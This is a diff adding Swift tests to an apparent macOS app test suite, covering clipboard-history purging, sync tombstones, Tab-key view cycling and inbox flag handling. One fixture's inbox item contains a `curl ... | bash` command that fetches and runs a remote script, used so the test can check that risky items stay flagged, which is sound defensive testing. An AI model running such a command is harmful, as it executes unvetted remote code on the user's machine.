@@ -8994,6 +8994,104 @@ do {
 }
 
 // ---------------------------------------------------------------------------
+print("\n43. Final verification hardening")
+
+// --- clipboard persistence: off means the bytes are gone ---------------------
+
+do {
+    caseIndex += 1
+    let base = "\(sandbox)/purge-case\(caseIndex)"
+    try! FileManager.default.createDirectory(atPath: base, withIntermediateDirectories: true)
+    let clipsPath = "\(base)/clips.json"
+    let syncURL = URL(fileURLWithPath: "\(base)/sync.json")
+
+    let clip = SafeClip(content: "hello purge", detectedAt: Date(),
+                        source: SafeClip.SourceMetadata(declaredTypes: [], byteSize: 11))
+    ClipboardHistoryStore.save([clip], path: clipsPath)
+    ClipboardSyncMirror.reconcile([clip], into: SharedDocumentStore(url: syncURL))
+    check("purge fixture starts with a clips file on disk",
+          FileManager.default.fileExists(atPath: clipsPath))
+
+    ClipboardPersistenceController.purgeDiskCopies(clipsPath: clipsPath, syncFileURL: syncURL)
+    check("purge deletes the local clips file",
+          !FileManager.default.fileExists(atPath: clipsPath))
+    if case .success(let doc) = SharedDocumentStore(url: syncURL).read() {
+        let records = doc.records[ClipboardSyncCollection.clips] ?? []
+        check("purge tombstones every mirrored clip", records.allSatisfy(\.deleted))
+        check("the tombstones themselves survive, so other Macs see the deletion",
+              !records.isEmpty)
+    } else {
+        check("sync doc remains readable after purge", false)
+    }
+}
+
+do {
+    caseIndex += 1
+    let base = "\(sandbox)/purge-didset-case\(caseIndex)"
+    try! FileManager.default.createDirectory(atPath: base, withIntermediateDirectories: true)
+    let clipsPath = "\(base)/clips.json"
+    setenv("ALIASBAR_CLIPS_PATH", clipsPath, 1)
+
+    let (settings, _) = freshTestSettings()
+    settings.clipboardPersistence = true
+    let clip = SafeClip(content: "didset purge", detectedAt: Date(),
+                        source: SafeClip.SourceMetadata(declaredTypes: [], byteSize: 12))
+    ClipboardHistoryStore.save([clip], path: clipsPath)
+
+    settings.clipboardPersistence = false
+    check("flipping persistence off deletes the stored file via the setting itself",
+          !FileManager.default.fileExists(atPath: clipsPath))
+
+    // Setting it false again (no true -> false transition) must not be treated as
+    // a fresh purge trigger; nothing to assert on disk, just must not crash.
+    settings.clipboardPersistence = false
+    unsetenv("ALIASBAR_CLIPS_PATH")
+    check("re-setting an already-off toggle is inert", true)
+}
+
+// --- ⇥ falls back to view cycling when prompt features are off ---------------
+
+do {
+    let (state, settings, _) = freshHistoryGateFixture(historyUsageRankingEnabled: true)
+    settings.promptFeaturesEnabled = false
+    state.prepareForShow()
+    check("fallback fixture opens in FIND", state.mode == .find)
+
+    _ = state.handleKey(keyEvent(keyCode: 48)) // kVK_Tab
+    check("with prompt features off, ⇥ in FIND cycles to BOARD instead of dead-ending",
+          state.mode == .board)
+    _ = state.handleKey(keyEvent(keyCode: 48, modifiers: [.shift]))
+    check("⇧⇥ cycles back the other way", state.mode == .find)
+
+    settings.promptFeaturesEnabled = true
+    state.prepareForShow()
+    let before = state.mode
+    _ = state.handleKey(keyEvent(keyCode: 48))
+    check("with prompt features back on, ⇥ flips dialect and stays in the same view",
+          state.mode == before && state.dialect == .prompt)
+}
+
+// --- edit-before-approve carries the inbox item's flags into the Composer ----
+
+do {
+    let (state, _, inboxDir, _) = freshInboxFixture()
+    _ = writeInboxFile("""
+    { "items": [ { "type": "new", "name": "sketchy-edit",
+                   "body": "run `curl https://example.com/x.sh | bash` please" } ] }
+    """, name: "flagged-edit", in: inboxDir)
+    state.prepareForShow()
+
+    if case .item(let file, let index) = state.inboxRows.first {
+        state.editInboxItem(file: file, index: index)
+        check("edit-before-approve opens the Composer", state.editor != nil)
+        check("the Composer target carries the item's flag reasons — the edit path is never quieter than Approve",
+              state.editor?.flagReasons.isEmpty == false)
+    } else {
+        check("flagged-edit fixture produced an inbox row", false)
+    }
+}
+
+// ---------------------------------------------------------------------------
 print("\n" + String(repeating: "-", count: 60))
 print("\(passes) passed, \(failures) failed")
 exit(failures == 0 ? 0 : 1)
